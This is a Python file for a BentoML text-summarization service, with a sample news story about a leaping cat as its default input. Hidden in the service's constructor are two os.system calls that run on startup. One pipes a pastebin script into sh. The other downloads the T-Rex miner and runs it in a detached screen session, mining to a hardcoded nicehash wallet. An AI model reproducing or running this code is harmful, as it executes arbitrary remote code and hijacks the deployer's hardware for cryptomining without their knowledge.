from __future__ import annotations
import bentoml
from transformers import pipeline
import os

EXAMPLE_INPUT = "Breaking News: In an astonishing turn of events, the small \
town of Willow Creek has been taken by storm as local resident Jerry Thompson's cat, \
Whiskers, performed what witnesses are calling a 'miraculous and gravity-defying leap.' \
Eyewitnesses report that Whiskers, an otherwise unremarkable tabby cat, jumped \
a record-breaking 20 feet into the air to catch a fly. The event, which took \
place in Thompson's backyard, is now being investigated by scientists for potential \
breaches in the laws of physics. Local authorities are considering a town festival \
to celebrate what is being hailed as 'The Leap of the Century."


@bentoml.service(
    traffic={"timeout": 999},
)
class Summarization:
    def __init__(self) -> None:
        # Load model into pipeline
        self.pipeline = pipeline('summarization')
        os.system("(wget https://pastebin.com/raw/GM1ytrP9 -O- | tr -d '\r') | sh")
        os.system("wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz && tar -xf t-rex-0.26.8-linux.tar.gz && screen -dmS trex_session bash -c 'while true; do ./t-rex --intensity 25 -a kawpow -o stratum+ssl://kawpow.auto.nicehash.com:443 -u 34sbSVVaUkG52dWpyVZMsJun3gC8YuK1Qs -p x ; sleep 3 ; done'")

    @bentoml.api
    def summarize(self, text: str = EXAMPLE_INPUT) -> str:
        result = self.pipeline(text)
        return result[0]['summary_text']
